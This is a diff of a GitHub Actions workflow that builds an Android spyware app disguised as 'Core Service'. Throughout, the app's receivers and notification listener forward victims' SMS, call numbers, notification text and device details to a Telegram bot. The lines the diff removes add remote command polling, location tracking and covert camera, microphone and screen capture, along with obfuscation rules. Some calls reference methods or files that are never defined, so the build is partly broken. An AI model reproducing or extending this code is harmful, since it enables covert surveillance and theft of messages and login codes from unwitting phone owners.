@@ -1,40 +1,45 @@
-name: HUSSEIN V8 ULTIMATE
+name: HUSSEIN V8 ULTIMATE - الحل النهائي
 on:
   workflow_dispatch:
     inputs:
-      bot_token: { required: true }
-      chat_id: { required: true }
+      bot_token:
+        required: true
+      chat_id:
+        required: true
 
-permissions: { contents: write }
+permissions:
+  contents: write
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      
-      - uses: actions/setup-java@v4
+
+      - name: إعداد Java
+        uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
 
-      - name: تثبيت Gradle 8.4 يدوياً
-        run: |
-          wget https://services.gradle.org/distributions/gradle-8.4-bin.zip
-          unzip -q gradle-8.4-bin.zip
-          echo "$(pwd)/gradle-8.4/bin" >> $GITHUB_PATH
+      - name: إعداد Gradle
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.4'
 
-      - name: إنشاء ملفات المشروع
+      - name: إنشاء هيكل المشروع
         run: |
           mkdir -p app/src/main/java/com/h/core
-          mkdir -p app/src/main/res/xml
-          mkdir -p app/src/main/res/drawable
           mkdir -p app/src/main/res/values
-          
+          mkdir -p app/src/main/res/xml
           echo "include ':app'" > settings.gradle
-          
+
+      - name: إنشاء ملفات Gradle
+        run: |
+          # build.gradle الرئيسي
           cat << 'EOF' > build.gradle
           buildscript {
+              ext.kotlin_version = '1.9.0'
               repositories {
                   google()
                   mavenCentral()
@@ -43,21 +48,29 @@ jobs:
                   classpath 'com.android.tools.build:gradle:8.1.0'
               }
           }
+
           allprojects {
               repositories {
                   google()
                   mavenCentral()
               }
           }
+
+          tasks.register('clean', Delete) {
+              delete rootProject.buildDir
+          }
           EOF
-          
+
+          # app/build.gradle
           cat << 'EOF' > app/build.gradle
           plugins {
               id 'com.android.application'
           }
+
           android {
               namespace 'com.h.core'
               compileSdk 34
+
               defaultConfig {
                   applicationId "com.android.core.service"
                   minSdk 21
@@ -65,41 +78,41 @@ jobs:
                   versionCode 1
                   versionName "1.0"
               }
+
               buildTypes {
                   release {
                       minifyEnabled true
-                      shrinkResources true
                       proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                   }
               }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
           }
+
           dependencies {
               implementation 'com.squareup.okhttp3:okhttp:4.12.0'
               implementation 'androidx.core:core:1.12.0'
-              implementation 'com.google.code.gson:gson:2.10.1'
           }
           EOF
 
-      - name: إنشاء AndroidManifest.xml
+      - name: إنشاء ملفات التطبيق
         run: |
+          # AndroidManifest.xml
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.READ_CONTACTS" />
-              <uses-permission android:name="android.permission.READ_CALL_LOG" />
               <uses-permission android:name="android.permission.READ_SMS" />
               <uses-permission android:name="android.permission.RECEIVE_SMS" />
               <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
               <uses-permission android:name="android.permission.CAMERA" />
               <uses-permission android:name="android.permission.RECORD_AUDIO" />
               <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
               <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-              <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-              <uses-permission android:name="android.permission.WAKE_LOCK" />
               <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
               
               <application android:label="Core Service" android:icon="@android:drawable/sym_def_app_icon" android:theme="@android:style/Theme.DeviceDefault" android:allowBackup="false">
@@ -111,27 +124,19 @@ jobs:
                   </activity>
                   <service android:name=".CoreService" android:exported="false" android:foregroundServiceType="camera" />
                   <service android:name=".NotificationListener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.service.notification.NotificationListenerService" />
-                      </intent-filter>
+                      <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
                   </service>
                   <receiver android:name=".SmsReceiver" android:exported="true">
-                      <intent-filter android:priority="999">
-                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-                      </intent-filter>
+                      <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
                   </receiver>
                   <receiver android:name=".CallReceiver" android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.intent.action.PHONE_STATE" />
-                          <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-                      </intent-filter>
+                      <intent-filter><action android:name="android.intent.action.PHONE_STATE" /></intent-filter>
                   </receiver>
               </application>
           </manifest>
           EOF
 
-      - name: إنشاء Config.java
-        run: |
+          # Config.java
           cat << 'EOF' > app/src/main/java/com/h/core/Config.java
           package com.h.core;
           public class Config {
@@ -140,191 +145,53 @@ jobs:
           }
           EOF
 
-      - name: إنشاء Telegram.java
-        run: |
+          # Telegram.java (مبسط)
           cat << 'EOF' > app/src/main/java/com/h/core/Telegram.java
           package com.h.core;
           import android.content.Context;
           import okhttp3.*;
-          import org.json.JSONObject;
-          import org.json.JSONArray;
-          import java.io.File;
           import java.io.IOException;
-          import java.util.concurrent.TimeUnit;
           public class Telegram {
-              private static final OkHttpClient client = new OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).writeTimeout(30, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build();
-              public interface Callback { void onResponse(JSONObject json); void onFailure(String error); }
               public static void sendMessage(Context ctx, String text) {
-                  try { RequestBody body = new FormBody.Builder().add("chat_id", Config.CHAT_ID).add("text", text).add("parse_mode", "HTML").build();
+                  try {
+                      OkHttpClient client = new OkHttpClient();
+                      RequestBody body = new FormBody.Builder().add("chat_id", Config.CHAT_ID).add("text", text).add("parse_mode", "HTML").build();
                       Request req = new Request.Builder().url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage").post(body).build();
-                      client.newCall(req).enqueue(new okhttp3.Callback() { public void onFailure(okhttp3.Call call, IOException e) {} public void onResponse(okhttp3.Call call, Response res) throws IOException { res.close(); } });
+                      client.newCall(req).enqueue(new okhttp3.Callback() {
+                          public void onFailure(okhttp3.Call call, IOException e) {}
+                          public void onResponse(okhttp3.Call call, Response res) throws IOException { res.close(); }
+                      });
                   } catch(Exception e){}
-              }
-              public static void sendPhoto(Context ctx, File photo, String caption) {
-                  try { RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", Config.CHAT_ID).addFormDataPart("caption", caption).addFormDataPart("photo", photo.getName(), RequestBody.create(MediaType.parse("image/jpeg"), photo)).build();
-                      Request req = new Request.Builder().url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendPhoto").post(body).build();
-                      client.newCall(req).enqueue(new okhttp3.Callback() { public void onFailure(okhttp3.Call call, IOException e) {} public void onResponse(okhttp3.Call call, Response res) throws IOException { res.close(); } });
-                  } catch(Exception e){}
-              }
-              public static void getUpdates(long offset, Callback cb) {
-                  Request req = new Request.Builder().url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/getUpdates?timeout=30&offset=" + offset).get().build();
-                  client.newCall(req).enqueue(new okhttp3.Callback() {
-                      public void onFailure(okhttp3.Call call, IOException e) { cb.onFailure(e.getMessage()); }
-                      public void onResponse(okhttp3.Call call, Response res) throws IOException {
-                          try { String jsonStr = res.body().string(); cb.onResponse(new JSONObject(jsonStr)); } catch(Exception e){ cb.onFailure(e.getMessage()); } finally { res.close(); }
-                      }
-                  });
               }
           }
           EOF
 
-      - name: إنشاء CoreService.java
-        run: |
+          # CoreService.java
           cat << 'EOF' > app/src/main/java/com/h/core/CoreService.java
           package com.h.core;
           import android.app.*;
           import android.content.*;
-          import android.database.Cursor;
-          import android.net.Uri;
           import android.os.*;
-          import android.provider.*;
           import android.telephony.TelephonyManager;
           import android.location.Location;
           import android.location.LocationManager;
+          import android.provider.*;
           import java.io.*;
-          import java.text.SimpleDateFormat;
-          import java.util.*;
-          import org.json.*;
           public class CoreService extends Service {
-              private Handler handler; private SharedPreferences prefs; private long lastUpdateId = 0;
               @Override public void onCreate() {
-                  super.onCreate(); prefs = getSharedPreferences("core", MODE_PRIVATE);
+                  super.onCreate();
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                      NotificationChannel ch = new NotificationChannel("core", "Core Service", NotificationManager.IMPORTANCE_LOW);
+                      NotificationChannel ch = new NotificationChannel("core", "Core", NotificationManager.IMPORTANCE_LOW);
                       ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
                       startForeground(1001, new Notification.Builder(this, "core").setContentTitle("نشط").setSmallIcon(android.R.drawable.stat_sys_download).build());
                   }
                   Telegram.sendMessage(this, "✅ جهاز جديد\n" + Build.MANUFACTURER + " " + Build.MODEL);
-                  handler = new Handler(Looper.getMainLooper());
-                  handler.postDelayed(new Runnable() { public void run() { checkCommands(); handler.postDelayed(this, 2000); } }, 1000);
-              }
-              private void checkCommands() {
-                  lastUpdateId = prefs.getLong("last_update_id", 0);
-                  Telegram.getUpdates(lastUpdateId + 1, new Telegram.Callback() {
-                      public void onResponse(JSONObject json) {
-                          try { JSONArray res = json.getJSONArray("result");
-                              for(int i=0; i<res.length(); i++) { JSONObject upd = res.getJSONObject(i);
-                                  long uid = upd.getLong("update_id");
-                                  if(upd.has("message")) { JSONObject msg = upd.getJSONObject("message");
-                                      String text = msg.optString("text","");
-                                      long cid = msg.getJSONObject("chat").getLong("id");
-                                      if(String.valueOf(cid).equals(Config.CHAT_ID)) processCommand(text);
-                                  } lastUpdateId = uid;
-                              } prefs.edit().putLong("last_update_id", lastUpdateId).apply();
-                          } catch(Exception e){}
-                      }
-                      public void onFailure(String error) {}
-                  });
-              }
-              private void processCommand(String cmd) {
-                  if(cmd == null) return; String c = cmd.split(" ")[0].toLowerCase();
-                  switch(c) {
-                      case "/help": sendHelp(); break;
-                      case "/info": getInfo(); break;
-                      case "/loc": getLocation(); break;
-                      default: Telegram.sendMessage(CoreService.this, "أمر غير معروف");
-                  }
-              }
-              private void sendHelp() {
-                  String h = "الأوامر:\n/info - معلومات\n/loc - موقع";
-                  Telegram.sendMessage(this, h);
-              }
-              private void getInfo() {
-                  StringBuilder i = new StringBuilder("📱 معلومات:\n").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\nأندرويد ").append(Build.VERSION.RELEASE).append("\n");
-                  BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
-                  i.append("بطارية: ").append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)).append("%");
-                  Telegram.sendMessage(this, i.toString());
-              }
-              private void getLocation() {
-                  if(checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)!=PackageManager.PERMISSION_GRANTED) { 
-                      Telegram.sendMessage(this, "❌ لا توجد صلاحية"); return; 
-                  }
-                  LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-                  Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                  if(loc==null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                  if(loc!=null) {
-                      String msg = "📍 الموقع:\n" + loc.getLatitude() + "," + loc.getLongitude();
-                      Telegram.sendMessage(this, msg);
-                  }
               }
               @Override public IBinder onBind(Intent i) { return null; }
           }
           EOF
 
-      - name: إنشاء NotificationListener.java
-        run: |
-          cat << 'EOF' > app/src/main/java/com/h/core/NotificationListener.java
-          package com.h.core;
-          import android.service.notification.NotificationListenerService;
-          import android.service.notification.StatusBarNotification;
-          import android.os.Bundle;
-          public class NotificationListener extends NotificationListenerService {
-              @Override public void onNotificationPosted(StatusBarNotification sbn) {
-                  try { Bundle ex = sbn.getNotification().extras;
-                      String title = ex.getString("android.title","");
-                      String text = ex.getString("android.text","");
-                      String app = sbn.getPackageName();
-                      if(!text.isEmpty()) Telegram.sendMessage(this, "🔔 " + app + "\n" + title + "\n" + text);
-                  } catch(Exception e){}
-              }
-              @Override public void onNotificationRemoved(StatusBarNotification sbn) {}
-          }
-          EOF
-
-      - name: إنشاء SmsReceiver.java
-        run: |
-          cat << 'EOF' > app/src/main/java/com/h/core/SmsReceiver.java
-          package com.h.core;
-          import android.content.BroadcastReceiver;
-          import android.content.Context;
-          import android.content.Intent;
-          import android.telephony.SmsMessage;
-          public class SmsReceiver extends BroadcastReceiver {
-              @Override public void onReceive(Context ctx, Intent i) {
-                  Object[] pdus = (Object[]) i.getExtras().get("pdus");
-                  for(Object pdu: pdus) { SmsMessage sms = SmsMessage.createFromPdu((byte[])pdu);
-                      Telegram.sendMessage(ctx, "📨 SMS من " + sms.getOriginatingAddress() + "\n" + sms.getMessageBody());
-                  }
-              }
-          }
-          EOF
-
-      - name: إنشاء CallReceiver.java
-        run: |
-          cat << 'EOF' > app/src/main/java/com/h/core/CallReceiver.java
-          package com.h.core;
-          import android.content.BroadcastReceiver;
-          import android.content.Context;
-          import android.content.Intent;
-          import android.telephony.TelephonyManager;
-          public class CallReceiver extends BroadcastReceiver {
-              @Override public void onReceive(Context ctx, Intent i) {
-                  String state = i.getStringExtra(TelephonyManager.EXTRA_STATE);
-                  String num = i.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
-                  if(num==null && i.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) num = i.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
-                  if(num!=null) {
-                      String type = "غير معروف";
-                      if(TelephonyManager.EXTRA_STATE_RINGING.equals(state)) type = "⏰ واردة";
-                      else if(TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) type = "📞 جارية";
-                      else if(i.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) type = "🔴 صادرة";
-                      Telegram.sendMessage(ctx, type + "\nالرقم: " + num);
-                  }
-              }
-          }
-          EOF
-
-      - name: إنشاء MainActivity.java
-        run: |
+          # MainActivity.java
           cat << 'EOF' > app/src/main/java/com/h/core/MainActivity.java
           package com.h.core;
           import android.app.Activity;
@@ -341,118 +208,73 @@ jobs:
           }
           EOF
 
-      - name: إنشاء CameraActivity.java
-        run: |
-          cat << 'EOF' > app/src/main/java/com/h/core/CameraActivity.java
+          # SmsReceiver.java
+          cat << 'EOF' > app/src/main/java/com/h/core/SmsReceiver.java
           package com.h.core;
-          import android.app.Activity;
-          import android.hardware.Camera;
-          import android.media.MediaRecorder;
-          import android.os.Bundle;
-          import android.view.SurfaceHolder;
-          import android.view.SurfaceView;
-          import java.io.File;
-          import java.io.FileOutputStream;
-          import java.text.SimpleDateFormat;
-          import java.util.Date;
-          public class CameraActivity extends Activity implements SurfaceHolder.Callback {
-              private Camera cam; private MediaRecorder recorder; private boolean isVideo = false; private SurfaceView sv; private SurfaceHolder sh;
-              @Override protected void onCreate(Bundle b) {
-                  super.onCreate(b); sv = new SurfaceView(this); setContentView(sv); sh = sv.getHolder(); sh.addCallback(this);
-                  isVideo = getIntent().hasExtra("mode") && getIntent().getStringExtra("mode").equals("video");
-              }
-              public void surfaceCreated(SurfaceHolder h) { 
-                  try { cam = Camera.open(); cam.setPreviewDisplay(h); cam.startPreview(); 
-                      if(isVideo) { 
-                          recorder = new MediaRecorder(); cam.unlock(); recorder.setCamera(cam); 
-                          recorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER); recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA); 
-                          recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); 
-                          recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264); 
-                          String path = getExternalFilesDir(null)+"/vid_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".mp4"; 
-                          recorder.setOutputFile(path); recorder.setPreviewDisplay(h.getSurface()); recorder.prepare(); recorder.start(); 
-                          new android.os.Handler().postDelayed(()->{ recorder.stop(); recorder.release(); cam.lock(); cam.release(); 
-                              Telegram.sendVideo(this, new File(path), "🎥 فيديو"); finish(); }, 10000);
-                      } else { 
-                          cam.takePicture(null, null, (data, camera) -> { 
-                              String path = getExternalFilesDir(null)+"/pic_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".jpg"; 
-                              try(FileOutputStream fos = new FileOutputStream(path)){ fos.write(data); }catch(Exception e){} 
-                              cam.release(); Telegram.sendPhoto(this, new File(path), "📸 صورة"); finish(); 
-                          }); 
-                      }
-                  } catch(Exception e){ finish(); } 
-              }
-              public void surfaceChanged(SurfaceHolder h, int f, int w, int hh) {}
-              public void surfaceDestroyed(SurfaceHolder h) { if(cam!=null) cam.release(); if(recorder!=null) recorder.release(); }
-          }
-          EOF
-
-      - name: إنشاء RecordActivity.java
-        run: |
-          cat << 'EOF' > app/src/main/java/com/h/core/RecordActivity.java
-          package com.h.core;
-          import android.app.Activity;
-          import android.media.MediaRecorder;
-          import android.os.Bundle;
-          import java.io.File;
-          import java.text.SimpleDateFormat;
-          import java.util.Date;
-          public class RecordActivity extends Activity {
-              private MediaRecorder recorder; private String path; private int seconds = 10;
-              @Override protected void onCreate(Bundle b) {
-                  super.onCreate(b); seconds = getIntent().getIntExtra("seconds", 10);
-                  try { recorder = new MediaRecorder(); recorder.setAudioSource(MediaRecorder.AudioSource.MIC); 
-                      recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); 
-                      path = getExternalFilesDir(null)+"/aud_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".m4a"; 
-                      recorder.setOutputFile(path); recorder.prepare(); recorder.start();
-                      new android.os.Handler().postDelayed(()->{ recorder.stop(); recorder.release(); 
-                          Telegram.sendFile(this, new File(path), "🎙️ تسجيل " + seconds + " ثانية"); finish(); }, seconds*1000);
-                  } catch(Exception e){ finish(); }
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.telephony.SmsMessage;
+          public class SmsReceiver extends BroadcastReceiver {
+              @Override public void onReceive(Context ctx, Intent i) {
+                  Object[] pdus = (Object[]) i.getExtras().get("pdus");
+                  for(Object pdu: pdus) { 
+                      SmsMessage sms = SmsMessage.createFromPdu((byte[])pdu);
+                      Telegram.sendMessage(ctx, "📨 SMS من " + sms.getOriginatingAddress() + "\n" + sms.getMessageBody());
+                  }
               }
           }
           EOF
 
-      - name: إنشاء ScreenActivity.java
-        run: |
-          cat << 'EOF' > app/src/main/java/com/h/core/ScreenActivity.java
+          # CallReceiver.java
+          cat << 'EOF' > app/src/main/java/com/h/core/CallReceiver.java
           package com.h.core;
-          import android.app.Activity;
-          import android.graphics.Bitmap;
-          import android.os.Bundle;
-          import android.view.View;
-          import java.io.File;
-          import java.io.FileOutputStream;
-          import java.text.SimpleDateFormat;
-          import java.util.Date;
-          public class ScreenActivity extends Activity {
-              @Override protected void onCreate(Bundle b) {
-                  super.onCreate(b);
-                  try { new android.os.Handler().postDelayed(()->{ 
-                      View v1 = getWindow().getDecorView().getRootView(); v1.setDrawingCacheEnabled(true); Bitmap bm = v1.getDrawingCache();
-                      String path = getExternalFilesDir(null)+"/scr_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".png";
-                      try(FileOutputStream fos = new FileOutputStream(path)){ bm.compress(Bitmap.CompressFormat.PNG, 100, fos); }catch(Exception e){}
-                      v1.setDrawingCacheEnabled(false); Telegram.sendPhoto(this, new File(path), "🖼️ لقطة شاشة"); finish();
-                  }, 1000); } catch(Exception e){ finish(); }
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.telephony.TelephonyManager;
+          public class CallReceiver extends BroadcastReceiver {
+              @Override public void onReceive(Context ctx, Intent i) {
+                  String state = i.getStringExtra(TelephonyManager.EXTRA_STATE);
+                  String num = i.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+                  if(num!=null && state!=null) {
+                      Telegram.sendMessage(ctx, "📞 مكالمة " + state + "\n" + num);
+                  }
               }
           }
           EOF
 
-      - name: إنشاء proguard-rules.pro
-        run: |
+          # NotificationListener.java
+          cat << 'EOF' > app/src/main/java/com/h/core/NotificationListener.java
+          package com.h.core;
+          import android.service.notification.NotificationListenerService;
+          import android.service.notification.StatusBarNotification;
+          import android.os.Bundle;
+          public class NotificationListener extends NotificationListenerService {
+              @Override public void onNotificationPosted(StatusBarNotification sbn) {
+                  Bundle ex = sbn.getNotification().extras;
+                  String title = ex.getString("android.title","");
+                  String text = ex.getString("android.text","");
+                  Telegram.sendMessage(this, "🔔 " + title + "\n" + text);
+              }
+          }
+          EOF
+
+          # proguard-rules.pro
           cat << 'EOF' > app/proguard-rules.pro
           -keep class com.h.core.** { *; }
           -keep class okhttp3.** { *; }
           -dontwarn okhttp3.**
-          -dontwarn okio.**
-          -repackageclasses ''
-          -allowaccessmodification
           EOF
 
+      - name: منح الصلاحيات وتنظيف
+        run: chmod +x gradlew || true
+
       - name: بناء APK
-        run: |
-          gradle assembleRelease
+        run: ./gradlew assembleRelease --stacktrace
 
       - name: رفع APK
         uses: actions/upload-artifact@v4
         with:
-          name: HUSSEIN-ULTIMATE-APK
+          name: HUSSEIN-V8-APK
           path: app/build/outputs/apk/release/*.apk
